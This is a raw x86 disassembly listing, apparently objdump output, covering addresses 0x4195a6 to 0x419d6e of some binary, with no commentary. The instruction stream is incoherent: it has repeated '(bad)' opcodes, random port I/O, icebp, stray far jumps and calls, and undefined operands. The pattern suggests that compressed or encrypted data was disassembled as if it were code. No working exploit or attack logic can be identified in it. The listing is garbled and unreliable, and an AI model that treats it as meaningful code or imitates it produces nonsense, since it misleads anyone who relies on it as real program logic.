  4195a6:	adc    cl,dh
  4195a8:	pusha  
  4195a9:	or     BYTE PTR [ebx],ah
  4195ab:	(bad)  
  4195ad:	sbb    eax,0xe4974894
  4195b2:	sbb    DWORD PTR ds:0xee98a3b6,esp
  4195b8:	xchg   ebp,eax
  4195b9:	or     BYTE PTR [edx-0x6c],bh
  4195bc:	ss xchg ebp,eax
  4195be:	and    DWORD PTR [ebx-0x21c8fe73],edi
  4195c4:	or     al,BYTE PTR [eax+0x52e77178]
  4195ca:	jne    0x41963f
  4195cc:	iret   
  4195cd:	adc    DWORD PTR [esi],eax
  4195cf:	cmp    DWORD PTR [ebx+0x7da7658b],0x74
  4195d6:	jns    0x41964e
  4195d8:	cmc    
  4195d9:	mov    ebx,0x3066c1b2
  4195de:	mov    cl,0x95
  4195e0:	mov    esp,ebx
  4195e2:	mov    ecx,0xc0ed900d
  4195e7:	xchg   ebx,eax
  4195e8:	aas    
  4195e9:	imul   ecx,ecx,0xfffffff2
  4195ec:	clc    
  4195ed:	inc    edi
  4195ee:	outs   dx,DWORD PTR ds:[esi]
  4195ef:	jo     0x41965e
  4195f1:	mov    dl,0x57
  4195f3:	cmc    
  4195f4:	adc    eax,0xf0e603b2
  4195f9:	nop    ebx
  4195fc:	push   eax
  4195fd:	(bad)  
  4195fe:	into   
  4195ff:	xor    BYTE PTR [edi+0x53],ch
  419602:	hlt    
  419603:	xchg   esi,eax
  419604:	daa    
  419605:	xchg   esi,eax
  419606:	ins    DWORD PTR es:[edi],dx
  419607:	adc    al,0x79
  419609:	mov    edi,0x63abf0b4
  41960e:	in     al,dx
  41960f:	dec    ecx
  419610:	std    
  419611:	xchg   edx,eax
  419612:	xor    BYTE PTR [edx-0x72],bl
  419615:	sbb    al,0x2d
  419617:	icebp  
  419618:	jle    0x41959d
  41961a:	pop    ebp
  41961b:	leave  
  41961c:	push   0x47
  41961e:	icebp  
  41961f:	mov    edx,0x65d19373
  419624:	add    eax,0x3377896f
  419629:	mov    cl,0x78
  41962b:	inc    ebx
  41962c:	cmp    eax,0x798fefcb
  419631:	and    edx,eax
  419633:	ss jb  0x419653
  419636:	ret    
  419637:	hlt    
  419638:	icebp  
  419639:	jae    0x41961a
  41963b:	cmp    al,0xb4
  41963d:	lds    edi,FWORD PTR [ecx]
  41963f:	cld    
  419640:	dec    esi
  419641:	mov    esi,0xd0300c01
  419646:	or     BYTE PTR [esi],cl
  419648:	or     eax,0x6499f755
  41964d:	test   BYTE PTR [ecx+0x79],cl
  419650:	mov    dh,0xdf
  419652:	pop    ds
  419653:	push   ebx
  419654:	or     BYTE PTR [esi],0x32
  419657:	cmp    eax,0xe95b00d4
  41965c:	xchg   edi,eax
  41965d:	leave  
  41965e:	mov    bh,0x7b
  419660:	pushf  
  419661:	xchg   ebp,eax
  419662:	test   DWORD PTR [edi],eax
  419664:	or     DWORD PTR [eax-0x57],esi
  419667:	xor    BYTE PTR [ebx-0x1f],bh
  41966a:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  41966c:	mov    ecx,0xeb683664
  419671:	cwde   
  419672:	stos   DWORD PTR es:[edi],eax
  419673:	shl    DWORD PTR [ecx+eiz*4+0x5b],0x13
  419678:	or     al,0x6f
  41967a:	test   DWORD PTR [eax+0x59],0x74da81f5
  419681:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419682:	or     DWORD PTR [esi],0x20abdefd
  419688:	daa    
  419689:	test   edi,esp
  41968b:	xor    BYTE PTR [edi+edi*2+0x1],dh
  41968f:	cmp    BYTE PTR [edx],dh
  419691:	and    esi,DWORD PTR [esi-0x12]
  419694:	push   ebp
  419695:	cmp    al,0x18
  419697:	or     edi,esp
  419699:	in     al,dx
  41969a:	inc    esi
  41969b:	and    DWORD PTR [ecx],esp
  41969d:	dec    eax
  41969e:	fs push cs
  4196a0:	and    cl,BYTE PTR ds:0xf9de0f3d
  4196a6:	sub    ecx,eax
  4196a8:	inc    esp
  4196a9:	in     al,0xb1
  4196ab:	jecxz  0x4196e9
  4196ad:	mov    edi,ebp
  4196af:	stos   BYTE PTR es:[edi],al
  4196b0:	sbb    ecx,DWORD PTR [esi]
  4196b2:	xor    eax,0xcf65f520
  4196b7:	repz sbb edi,DWORD PTR [eax+0x21993d85]
  4196be:	shr    edi,1
  4196c0:	not    BYTE PTR ss:[ebp-0x612a3ed0]
  4196c7:	cmp    eax,0x726da244
  4196cc:	fwait
  4196cd:	xor    eax,DWORD PTR [ebx+0x638e9df0]
  4196d3:	jle    0x4196e4
  4196d5:	jg     0x41971d
  4196d7:	push   ecx
  4196d8:	or     BYTE PTR [edx-0x36],dh
  4196db:	cwde   
  4196dc:	or     al,0x10
  4196de:	sub    DWORD PTR [ecx+esi*1+0x7f],0xfba1ee0b
  4196e6:	sub    al,al
  4196e8:	es stc 
  4196ea:	lahf   
  4196eb:	in     eax,dx
  4196ec:	stos   DWORD PTR es:[edi],eax
  4196ed:	sbb    BYTE PTR [esi+0x12fc49c1],bh
  4196f3:	xor    BYTE PTR cs:[ebx+ecx*1],0xa9
  4196f8:	aam    0xe8
  4196fa:	push   0x6a
  4196fc:	cld    
  4196fd:	or     eax,0xd65d4c8f
  419702:	es add eax,0xc2d130c6
  419708:	sbb    ebp,DWORD PTR [eax+0x6deeeaad]
  41970e:	sbb    al,0x79
  419710:	pop    ecx
  419711:	add    eax,0x1f6c4f39
  419716:	in     eax,dx
  419717:	mov    al,0x7f
  419719:	popa   
  41971a:	outs   dx,DWORD PTR ds:[esi]
  41971b:	iret   
  41971c:	jecxz  0x4196f7
  41971e:	jns    0x4196e8
  419720:	pop    esp
  419721:	mov    ds,edi
  419723:	dec    esi
  419724:	mov    bl,0x9f
  419726:	ficomp WORD PTR ds:0xf6757ec6
  41972c:	sbb    bh,al
  41972e:	(bad)  
  41972f:	mov    ah,0x38
  419731:	leave  
  419732:	aam    0x34
  419734:	cli    
  419735:	adc    al,BYTE PTR [ebx+0x455d6c09]
  41973b:	pop    eax
  41973c:	xor    BYTE PTR [ebp+esi*8-0x3a],dh
  419740:	(bad)  
  419741:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419742:	push   es
  419743:	pop    ecx
  419744:	push   ds
  419745:	jns    0x41971e
  419747:	ret    
  419748:	data16 (bad) 
  41974a:	xchg   edi,eax
  41974b:	popa   
  41974c:	adc    cl,BYTE PTR [eax-0x700caa3a]
  419752:	in     eax,dx
  419753:	ja     0x4197d4
  419755:	push   ebx
  419756:	cmp    eax,0x5e39901e
  41975b:	(bad)
  41975f:	and    al,0x73
  419761:	rcr    DWORD PTR [edx],0x66
  419764:	(bad)  
  419766:	imul   edx,DWORD PTR [edx+0x14],0x7eddefb6
  41976d:	aaa    
  41976e:	push   edx
  41976f:	scas   eax,DWORD PTR es:[edi]
  419770:	mov    esp,0x9fc318ae
  419775:	rep ins DWORD PTR es:[edi],dx
  419777:	lods   al,BYTE PTR ds:[esi]
  419778:	mov    ch,0x83
  41977a:	pop    ds
  41977b:	cmp    bh,BYTE PTR [edi]
  41977d:	mov    eax,0x34d9d022
  419782:	aad    0x2f
  419784:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419785:	call   0x794b:0xa57f586b
  41978c:	outs   dx,DWORD PTR ds:[esi]
  41978d:	jns    0x419719
  41978f:	sbb    ecx,DWORD PTR [edi+0x432b30b4]
  419795:	push   eax
  419796:	mov    eax,ds:0xcb113bae
  41979b:	jg     0x41976e
  41979d:	imul   eax,DWORD PTR [edi+esi*4-0xccd5e72],0x38
  4197a5:	ins    DWORD PTR es:[edi],dx
  4197a6:	inc    edx
  4197a7:	out    0xac,al
  4197a9:	add    BYTE PTR [eax],ch
  4197ab:	lods   eax,DWORD PTR ds:[esi]
  4197ac:	inc    esi
  4197ad:	ret    0x187a
  4197b0:	sahf   
  4197b1:	xchg   ebx,eax
  4197b2:	test   DWORD PTR [ecx+0xf01677a],0xa64f169a
  4197bc:	cmp    bh,BYTE PTR ds:0xcea4da9c
  4197c2:	jbe    0x419773
  4197c4:	push   0xfffffff9
  4197c6:	add    cl,dl
  4197c8:	gs nop
  4197ca:	test   DWORD PTR [ebx+ebx*4+0x70f8b53d],esp
  4197d1:	jecxz  0x4197e2
  4197d3:	enter  0xf18e,0xfd
  4197d7:	sbb    al,0xa
  4197d9:	push   ecx
  4197da:	cmc    
  4197db:	scas   al,BYTE PTR es:[edi]
  4197dc:	aad    0x53
  4197de:	jnp    0x4197e4
  4197e0:	scas   al,BYTE PTR es:[edi]
  4197e1:	and    DWORD PTR [esi],edi
  4197e3:	shl    DWORD PTR [ebp-0x3b],1
  4197e6:	jmp    0x7534:0xdb5e1ee5
  4197ed:	pop    eax
  4197ee:	mov    eax,0xcb035fe1
  4197f3:	daa    
  4197f4:	jnp    0x41983a
  4197f6:	data16 aaa 
  4197f8:	in     al,0x58
  4197fa:	sbb    DWORD PTR [esi+0x7c9742dd],ebx
  419800:	jge    0x41980d
  419802:	gs lock cld 
  419805:	popf   
  419806:	sub    eax,DWORD PTR [ecx+0x19e08ecb]
  41980c:	cmc    
  41980d:	fcomp  DWORD PTR [ecx-0x80]
  419810:	mov    WORD PTR [ebp+eiz*1-0x3a],gs
  419814:	inc    ebx
  419815:	out    0xb5,eax
  419817:	inc    BYTE PTR [edi+ebx*4-0x43]
  41981b:	pop    es
  41981c:	nop
  41981d:	imul   esp,DWORD PTR [edx+eax*4],0xa0522b88
  419824:	inc    edx
  419825:	xchg   esp,eax
  419826:	rol    DWORD PTR [ecx+edx*1-0x2715ceb1],0xee
  41982e:	pop    DWORD PTR [ecx+esi*4]
  419831:	fnstenv [esi-0x14]
  419834:	imul   ecx,DWORD PTR [eax],0xffffff88
  419837:	jmp    0x41988a
  419839:	jno    0x419821
  41983b:	fdiv   QWORD PTR [edi]
  41983d:	pop    ds
  41983e:	ds sbb eax,0x91f55776
  419844:	in     eax,dx
  419845:	ins    DWORD PTR es:[edi],dx
  419846:	mov    dl,0xb7
  419848:	push   esi
  419849:	add    DWORD PTR [esi+0x4f1f959b],ebx
  41984f:	lock sbb eax,0x4c778efd
  419855:	fs popa 
  419857:	xor    cl,ah
  419859:	fistp  WORD PTR [edx]
  41985b:	loop   0x41981d
  41985d:	mov    bl,0x8c
  41985f:	or     ch,dl
  419861:	popa   
  419862:	popf   
  419863:	adc    eax,0x5e9a809f
  419868:	adc    DWORD PTR [esi],ebp
  41986a:	mov    ebp,0x1674062c
  41986f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419870:	cmc    
  419871:	daa    
  419872:	(bad)  
  419873:	leave  
  419874:	loop   0x4198af
  419876:	imul   DWORD PTR [ebp+0x41849ce]
  41987c:	sbb    ah,BYTE PTR [esi]
  41987e:	mov    ecx,0xc7215a3b
  419883:	xor    al,BYTE PTR [edi]
  419885:	mov    bh,BYTE PTR [edx-0x9666755]
  41988b:	adc    eax,0xda946ab7
  419890:	imul   ecx,DWORD PTR [edx],0x2b
  419893:	push   es
  419894:	(bad)  
  419895:	cdq    
  419896:	out    dx,eax
  419897:	mov    ebp,0xe160cea1
  41989c:	inc    eax
  41989d:	xchg   edi,eax
  41989e:	add    esp,ecx
  4198a0:	xor    eax,0x42edcda0
  4198a5:	pop    es
  4198a6:	cwde   
  4198a7:	fadd   DWORD PTR [ecx]
  4198a9:	inc    esp
  4198aa:	cmc    
  4198ab:	pop    eax
  4198ac:	jbe    0x4198b0
  4198ae:	pop    ebx
  4198af:	pop    ds
  4198b0:	cmp    ecx,DWORD PTR [esi-0x24]
  4198b3:	or     cl,BYTE PTR [ebx+0x3d]
  4198b6:	bound  edx,QWORD PTR [edx+0x47]
  4198b9:	not    DWORD PTR [edi+0x2a]
  4198bc:	aad    0xa6
  4198be:	push   edx
  4198bf:	sub    al,0x3e
  4198c1:	sbb    BYTE PTR [edx+0x3e],0x3f
  4198c5:	jo     0x41987f
  4198c7:	cmp    al,BYTE PTR [ecx]
  4198c9:	js     0x419853
  4198cb:	push   0xfffffff3
  4198cd:	rep lods eax,DWORD PTR ds:[esi]
  4198cf:	arpl   WORD PTR [eax-0x70],sp
  4198d2:	mov    eax,ds:0xb2590f35
  4198d7:	pusha  
  4198d8:	icebp  
  4198d9:	dec    esp
  4198da:	jno    0x419894
  4198dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4198dd:	dec    esp
  4198de:	cmp    cl,bh
  4198e0:	xchg   esp,eax
  4198e1:	into   
  4198e2:	or     eax,0x31a1058f
  4198e7:	cld    
  4198e8:	add    eax,eax
  4198ea:	repz loop 0x4198df
  4198ed:	mov    ds:0x904d1cf5,eax
  4198f2:	int3   
  4198f3:	aam    0xc0
  4198f5:	fs int3 
  4198f7:	jnp    0x4198a7
  4198f9:	or     eax,0x6d7b0029
  4198fe:	xlat   BYTE PTR ds:[ebx]
  4198ff:	in     eax,dx
  419900:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419901:	sbb    DWORD PTR [edx+0x5a],0xfdcba954
  419908:	jnp    0x41992c
  41990a:	pop    edi
  41990b:	mov    sp,0x2300
  41990f:	sbb    cl,BYTE PTR [ecx+0x13]
  419912:	fidivr WORD PTR [edx-0x4a8c9326]
  419918:	into   
  419919:	add    BYTE PTR [edx+0x57d06e4a],bl
  41991f:	fnstenv [eax-0x72]
  419922:	call   0xbda15303
  419927:	aad    0x90
  419929:	push   edx
  41992a:	int    0x30
  41992c:	loope  0x419932
  41992e:	call   0x82dc0ec9
  419933:	dec    esp
  419934:	cmp    eax,0xd465e4dd
  419939:	out    0xce,al
  41993b:	outs   dx,BYTE PTR ds:[esi]
  41993c:	nop
  41993d:	pop    ds
  41993e:	sbb    edx,DWORD PTR [edi+0x70c9b73b]
  419944:	xor    ecx,DWORD PTR [esi+edi*4-0x6d8f8b7c]
  41994b:	scas   eax,DWORD PTR es:[edi]
  41994c:	fstp   QWORD PTR [esp+edx*4+0x62]
  419950:	jmp    0x419933
  419952:	xchg   ecx,eax
  419953:	pusha  
  419954:	repz dec edi
  419956:	push   edx
  419957:	jmp    DWORD PTR [edx-0x53]
  41995a:	loopne 0x419911
  41995c:	outs   dx,BYTE PTR ds:[esi]
  41995d:	fsub   QWORD PTR [ecx+0x5c]
  419960:	retf   
  419961:	or     al,0x7e
  419963:	fs popa 
  419965:	sti    
  419966:	rcl    eax,0x5f
  419969:	in     eax,dx
  41996a:	sbb    ah,bl
  41996c:	loop   0x419988
  41996e:	in     al,dx
  41996f:	aas    
  419970:	or     eax,0xf22291a3
  419975:	out    0xfb,al
  419977:	out    dx,eax
  419978:	push   ebx
  419979:	adc    BYTE PTR [ebx+0x1c4e8866],ch
  41997f:	dec    ecx
  419980:	sub    al,0xea
  419982:	jns    0x419928
  419984:	add    ecx,edx
  419986:	bound  ecx,QWORD PTR [edx+0x4]
  419989:	xor    dl,BYTE PTR [ecx-0x3f73a12]
  41998f:	adc    al,0x4e
  419991:	mov    dl,0x61
  419993:	mov    eax,0xd9666d99
  419998:	lea    esp,[ecx]
  41999a:	stos   BYTE PTR es:[edi],al
  41999b:	mov    edx,0xb108da2
  4199a0:	sbb    al,0x9b
  4199a2:	div    ah
  4199a4:	push   ss
  4199a5:	sub    BYTE PTR [ecx+0x79],0xe1
  4199a9:	int    0xa0
  4199ab:	pop    ebp
  4199ac:	test   eax,0xbd53ba2d
  4199b1:	sbb    eax,0x2a6b77e0
  4199b6:	into   
  4199b7:	xchg   cl,ch
  4199b9:	fisttp DWORD PTR [edi+0x3ff1ba1f]
  4199bf:	pop    ds
  4199c0:	jno    0x4199af
  4199c2:	xchg   DWORD PTR ds:[edi],esp
  4199c5:	mov    WORD PTR [esi+0x23],cs
  4199c8:	mov    es,esp
  4199ca:	adc    edi,DWORD PTR [edi-0x3f1cce96]
  4199d0:	ficom  DWORD PTR [ecx+0x7f]
  4199d3:	iret   
  4199d4:	mov    al,ds:0x5c3a5232
  4199d9:	aaa    
  4199da:	dec    edx
  4199db:	data16 popfw 
  4199de:	test   dh,0x84
  4199e1:	out    0x29,al
  4199e3:	lods   eax,DWORD PTR ds:[esi]
  4199e4:	xor    bl,BYTE PTR ds:0x72569933
  4199ea:	aad    0x8
  4199ec:	(bad)  
  4199ed:	loopne 0x419978
  4199ef:	ficom  WORD PTR [ebx+0x7704c37d]
  4199f5:	(bad)  
  4199f7:	into   
  4199f8:	or     eax,0x187ec2a8
  4199fd:	mov    BYTE PTR [ecx+0x7536818e],0x24
  419a04:	scas   al,BYTE PTR es:[edi]
  419a05:	mov    ds:0xe5472894,al
  419a0a:	add    al,0xba
  419a0c:	in     al,dx
  419a0d:	out    0xb1,eax
  419a0f:	and    eax,0xbeef5b4c
  419a14:	test   DWORD PTR [edi+0x49c08965],eax
  419a1a:	nop
  419a1b:	pop    edi
  419a1c:	pop    edx
  419a1d:	cmp    DWORD PTR [edx-0x47ae8931],edi
  419a23:	push   edx
  419a24:	sbb    al,0xa
  419a26:	push   edi
  419a27:	add    eax,DWORD PTR [edi]
  419a29:	jle    0x419a83
  419a2b:	add    edi,edx
  419a2d:	outs   dx,DWORD PTR ds:[esi]
  419a2e:	cmc    
  419a2f:	xor    edx,DWORD PTR ds:0x4e9bec17
  419a35:	cmp    BYTE PTR [edi-0x2a3c416a],0xf8
  419a3c:	add    BYTE PTR [ebx-0x25],ch
  419a3f:	add    al,dh
  419a41:	xor    esi,edi
  419a43:	inc    ebp
  419a44:	mov    ds,WORD PTR [edx-0x5802678c]
  419a4a:	mov    ?,WORD PTR [edi+0x46c29740]
  419a50:	test   eax,0xd2dfe039
  419a55:	mov    eax,0x1c9037e9
  419a5a:	xchg   BYTE PTR [ecx-0x7f3023d1],bl
  419a60:	mov    edx,0xa6ec6276
  419a65:	inc    ecx
  419a66:	mul    al
  419a68:	or     eax,0x2c94f34b
  419a6d:	std    
  419a6e:	(bad)  
  419a6f:	fcomp  QWORD PTR [edi+0x46]
  419a72:	lds    ecx,FWORD PTR [ebp-0x30]
  419a75:	das    
  419a76:	cld    
  419a77:	and    eax,0xf98180f2
  419a7c:	push   edi
  419a7d:	js     0x419ace
  419a7f:	pop    ebx
  419a80:	mov    ebp,es
  419a82:	aaa    
  419a83:	jp     0x419a34
  419a85:	sub    DWORD PTR [ebp+0x29],esi
  419a88:	cwde   
  419a89:	mov    ah,0xa0
  419a8b:	cmp    BYTE PTR [edx],bl
  419a8d:	scas   eax,DWORD PTR es:[edi]
  419a8e:	fstp   DWORD PTR [esi]
  419a90:	aad    0x19
  419a92:	and    eax,DWORD PTR [ecx]
  419a94:	(bad)  
  419a96:	and    ah,BYTE PTR [edx]
  419a98:	and    eax,0xb91526f3
  419a9d:	xchg   BYTE PTR [edi-0x70e164a0],dh
  419aa3:	test   eax,0x31b15f79
  419aa8:	xlat   BYTE PTR ds:[ebx]
  419aa9:	dec    ecx
  419aaa:	jo     0x419a2c
  419aac:	in     eax,dx
  419aad:	xor    al,0xd2
  419aaf:	push   eax
  419ab0:	mov    ds:0x575bf0d0,al
  419ab5:	shl    DWORD PTR [edx-0x22fc6bf5],cl
  419abb:	aas    
  419abc:	js     0x419a91
  419abe:	jg     0x419a4f
  419ac0:	stos   BYTE PTR es:[edi],al
  419ac1:	test   eax,0x1ac7acf8
  419ac6:	pusha  
  419ac7:	sbb    eax,0x58b76b3a
  419acc:	stos   BYTE PTR es:[edi],al
  419acd:	out    dx,al
  419ace:	xor    BYTE PTR [ecx+0xb],dh
  419ad1:	mov    al,ds:0x79bb18e1
  419ad6:	add    BYTE PTR [eax+ebp*1],0x86
  419ada:	jo     0x419aba
  419adc:	data16 jnp 0x419b07
  419adf:	(bad)  
  419ae0:	adc    ebp,edx
  419ae2:	pop    edi
  419ae3:	or     bh,bl
  419ae5:	inc    edi
  419ae6:	cmp    ebp,DWORD PTR [ebx]
  419ae8:	adc    ah,BYTE PTR ds:0xefa9117d
  419aee:	ins    BYTE PTR es:[edi],dx
  419aef:	mov    DWORD PTR [ebx+0x5e126032],ecx
  419af5:	push   edx
  419af6:	sar    DWORD PTR [ebx+0x486a52dc],0xef
  419afd:	jg     0x419b2b
  419aff:	push   ds
  419b00:	inc    esp
  419b01:	jo     0x419abf
  419b03:	sbb    esp,DWORD PTR [ebp+0x3e]
  419b06:	dec    ebp
  419b07:	cs xor eax,0xdf093ec
  419b0d:	sub    DWORD PTR [ecx],ebx
  419b0f:	sbb    al,0xdd
  419b11:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419b12:	cmp    edx,DWORD PTR [eax]
  419b14:	xchg   BYTE PTR [esi+0x3a9051ad],bl
  419b1a:	imul   esp,DWORD PTR [esi+esi*4+0x279443ec],0xa9fa9fa2
  419b25:	cwde   
  419b26:	enter  0x89bd,0x4b
  419b2a:	xor    al,0x3e
  419b2c:	xchg   DWORD PTR [edx-0x2b39a89b],esp
  419b32:	xchg   edi,eax
  419b33:	dec    edx
  419b34:	or     al,cl
  419b36:	push   ebx
  419b37:	mov    ch,0x2e
  419b39:	dec    ebx
  419b3a:	pop    ss
  419b3b:	icebp  
  419b3c:	fucom  st(6)
  419b3e:	jecxz  0x419b4d
  419b40:	adc    dh,BYTE PTR [edi+ecx*2]
  419b43:	mov    ds:0xe53b909,eax
  419b48:	repnz pop edx
  419b4a:	shl    dl,0x7c
  419b4d:	xor    eax,0xe4228128
  419b52:	and    al,0xd7
  419b54:	out    0x29,eax
  419b56:	ror    bh,cl
  419b58:	addr16 icebp 
  419b5a:	test   BYTE PTR [ebx+0x53],ch
  419b5d:	cmp    BYTE PTR es:[ecx],ch
  419b60:	ins    BYTE PTR es:[edi],dx
  419b61:	sbb    DWORD PTR [ebx+0x14ceea9d],0x6760fc5c
  419b6b:	xchg   ebp,eax
  419b6c:	mov    ch,0x94
  419b6e:	or     BYTE PTR [esi],dl
  419b70:	pop    esp
  419b71:	pop    eax
  419b72:	pop    esi
  419b73:	lock lahf 
  419b75:	ja     0x419b6d
  419b77:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419b78:	fldenv [edi+0x33]
  419b7b:	dec    ecx
  419b7c:	cwde   
  419b7d:	into   
  419b7e:	iret   
  419b7f:	ror    DWORD PTR [ebx-0x46],0x48
  419b83:	xchg   esi,eax
  419b84:	inc    ecx
  419b85:	dec    edx
  419b86:	sbb    DWORD PTR [ecx-0x629cc3ba],edi
  419b8c:	adc    BYTE PTR [ecx],bl
  419b8e:	stos   BYTE PTR es:[edi],al
  419b8f:	out    dx,al
  419b90:	jmp    0x419b26
  419b92:	bound  esi,QWORD PTR [eax+eiz*8-0x13]
  419b96:	rcr    BYTE PTR [eax],cl
  419b98:	mov    WORD PTR [ebx+0x1ef02171],?
  419b9e:	xor    al,BYTE PTR [eax+0x2]
  419ba1:	aad    0x19
  419ba3:	out    dx,al
  419ba4:	rol    ah,0x10
  419ba7:	clc    
  419ba8:	aad    0x91
  419baa:	aaa    
  419bab:	repz leave 
  419bad:	out    0x53,eax
  419baf:	out    0x63,eax
  419bb1:	inc    ebx
  419bb2:	in     al,dx
  419bb3:	mov    ch,0xfc
  419bb5:	sti    
  419bb6:	adc    eax,0x2dc773c4
  419bbb:	sub    esp,DWORD PTR ss:[ecx]
  419bbe:	adc    DWORD PTR [ebx+eax*8-0x15],ebx
  419bc2:	xchg   BYTE PTR [ebp+0x2e],dh
  419bc5:	mov    esi,0x30fdfd05
  419bca:	jecxz  0x419c47
  419bcc:	ss int 0xd3
  419bcf:	mov    ebp,0x9f78d13
  419bd4:	imul   BYTE PTR [esi+0x7f4eb405]
  419bda:	rcl    BYTE PTR [edi-0x24],cl
  419bdd:	jns    0x419b7d
  419bdf:	test   eax,0x10058a5f
  419be4:	add    DWORD PTR [ebx],ecx
  419be6:	into   
  419be7:	mov    ecx,0x7477c917
  419bec:	adc    ebx,esi
  419bee:	scas   al,BYTE PTR es:[edi]
  419bef:	lds    edi,FWORD PTR [eax]
  419bf1:	push   es
  419bf2:	test   eax,0x7183fb8d
  419bf7:	test   al,0xe0
  419bf9:	inc    esi
  419bfa:	push   esp
  419bfb:	lea    ebp,[ebx+ecx*4-0xc9ef143]
  419c02:	dec    edx
  419c03:	sbb    esp,DWORD PTR [edx-0x72]
  419c06:	cld    
  419c07:	pop    ss
  419c08:	retf   
  419c09:	int    0x29
  419c0b:	or     dl,BYTE PTR [edi+0x59]
  419c0e:	in     eax,dx
  419c0f:	jmp    0x6acebe56
  419c14:	fcomp  QWORD PTR [ebp-0x2b8dc28a]
  419c1a:	in     eax,0x40
  419c1c:	jl     0x419c23
  419c1e:	cwde   
  419c1f:	lods   eax,DWORD PTR ds:[esi]
  419c20:	stos   BYTE PTR es:[edi],al
  419c21:	stos   BYTE PTR es:[edi],al
  419c22:	scas   al,BYTE PTR es:[edi]
  419c23:	cmp    cl,BYTE PTR [edx+ecx*2-0x228c6b24]
  419c2a:	sahf   
  419c2b:	jns    0x419baf
  419c2d:	test   al,0xa6
  419c2f:	mov    eax,0x15376b98
  419c34:	or     eax,0xc68487f2
  419c39:	lea    edx,[esi+0x49]
  419c3c:	rol    DWORD PTR [eax-0x92a691b],cl
  419c42:	inc    eax
  419c43:	push   0xffffff98
  419c45:	lea    esp,ds:[ebx+eiz*1+0x2c]
  419c4a:	jnp    0x419c6f
  419c4c:	scas   al,BYTE PTR es:[edi]
  419c4d:	call   0x87982d22
  419c52:	inc    eax
  419c53:	lahf   
  419c54:	out    0xb8,eax
  419c56:	pop    esi
  419c57:	adc    ch,ch
  419c59:	sub    eax,0x5c8b21e5
  419c5e:	dec    ebp
  419c5f:	sub    DWORD PTR [ecx],ebx
  419c61:	cmc    
  419c62:	sbb    BYTE PTR [ecx-0x3c0b32ff],0x9a
  419c69:	or     eax,0x8aa6b6f5
  419c6e:	cmp    eax,0xef2ec77a
  419c73:	retf   
  419c74:	imul   ebx,DWORD PTR [edx-0x4062da4e],0xcaecfd55
  419c7e:	cwde   
  419c7f:	in     eax,0xdc
  419c81:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419c82:	push   ebx
  419c83:	aad    0x71
  419c85:	fsubr  st,st(5)
  419c87:	ret    0xefb0
  419c8a:	mov    esp,0x6b16c819
  419c8f:	aam    0x7
  419c91:	das    
  419c92:	inc    ecx
  419c93:	cmp    BYTE PTR [esi],dl
  419c95:	pop    ebp
  419c96:	push   esi
  419c97:	xor    eax,0x9aaacaf
  419c9c:	push   ebp
  419c9d:	cmp    edi,DWORD PTR [eax-0x1abc5bdf]
  419ca3:	cs cmp ch,dl
  419ca6:	sbb    esp,ebx
  419ca8:	push   edi
  419ca9:	in     eax,dx
  419caa:	ins    DWORD PTR es:[edi],dx
  419cab:	hlt    
  419cac:	test   bh,dh
  419cae:	xlat   BYTE PTR ds:[ebx]
  419caf:	sbb    eax,0x34035ff5
  419cb4:	lods   eax,DWORD PTR ds:[esi]
  419cb5:	adc    ecx,DWORD PTR [ecx]
  419cb7:	push   ecx
  419cb8:	jle    0x419d31
  419cba:	xchg   ecx,eax
  419cbb:	push   edx
  419cbc:	inc    eax
  419cbd:	dec    esp
  419cbe:	arpl   WORD PTR [esi-0x3bc6dc89],bx
  419cc4:	or     dh,dl
  419cc6:	push   esi
  419cc7:	xor    al,0x9f
  419cc9:	mov    edx,0xa45c6b6e
  419cce:	std    
  419ccf:	repz push eax
  419cd1:	inc    eax
  419cd2:	inc    ebp
  419cd3:	aas    
  419cd4:	fadd   DWORD PTR [ebp-0x45efc98f]
  419cda:	inc    esi
  419cdb:	hlt    
  419cdc:	xchg   edi,eax
  419cdd:	mov    cl,BYTE PTR [eax+esi*8-0x39]
  419ce1:	adc    BYTE PTR [eax],0xef
  419ce4:	pop    esi
  419ce5:	add    eax,0x19d29e37
  419cea:	cmp    eax,0x6258bc66
  419cef:	fcom   DWORD PTR [edx-0xc174dfb]
  419cf5:	xchg   esp,eax
  419cf6:	pop    esp
  419cf7:	jb     0x419c8d
  419cf9:	bound  edi,QWORD PTR [ecx]
  419cfb:	ins    DWORD PTR es:[edi],dx
  419cfc:	mov    ch,0x8
  419cfe:	ror    BYTE PTR [edx-0x5a],1
  419d01:	sbb    bh,ch
  419d03:	mov    DWORD PTR [ebp+0x4b196f74],ecx
  419d09:	add    dl,BYTE PTR [esi+0x17acd9a4]
  419d0f:	xchg   BYTE PTR [ecx],cl
  419d11:	in     eax,0xbd
  419d13:	call   0x4c57:0xa49bbb23
  419d1a:	push   cs
  419d1b:	pop    esp
  419d1c:	mov    dh,0xa2
  419d1e:	fldcw  WORD PTR ds:0x8d04d115
  419d24:	hlt    
  419d25:	nop
  419d26:	enter  0x306d,0xaa
  419d2a:	xchg   ebp,eax
  419d2b:	or     ah,BYTE PTR [eax+0x49a25b2d]
  419d31:	aas    
  419d32:	pop    eax
  419d33:	pop    es
  419d34:	cmp    bh,BYTE PTR [ecx+0x5f]
  419d37:	loopne 0x419d85
  419d39:	ins    BYTE PTR es:[edi],dx
  419d3a:	sub    dl,BYTE PTR [edi+0x50c5623d]
  419d40:	cwde   
  419d41:	rcr    DWORD PTR [edi],cl
  419d43:	sbb    cl,BYTE PTR [edx-0x208d7fa2]
  419d49:	dec    esp
  419d4a:	lds    edi,FWORD PTR ds:0x2112c1a4
  419d50:	adc    ecx,DWORD PTR [esi]
  419d52:	in     al,dx
  419d53:	cs mov al,0xd2
  419d56:	mov    WORD PTR [esi+ebx*8],es
  419d59:	dec    ecx
  419d5a:	scas   eax,DWORD PTR es:[edi]
  419d5b:	aam    0x6f
  419d5d:	sub    dh,BYTE PTR [eiz*1+0x46fd8647]
  419d64:	add    ebp,DWORD PTR [edi]
  419d66:	mov    WORD PTR [edi+0x6a],?
  419d69:	mov    edi,0x80bef4a7
  419d6e:	mov    ebx,0xd699f17b
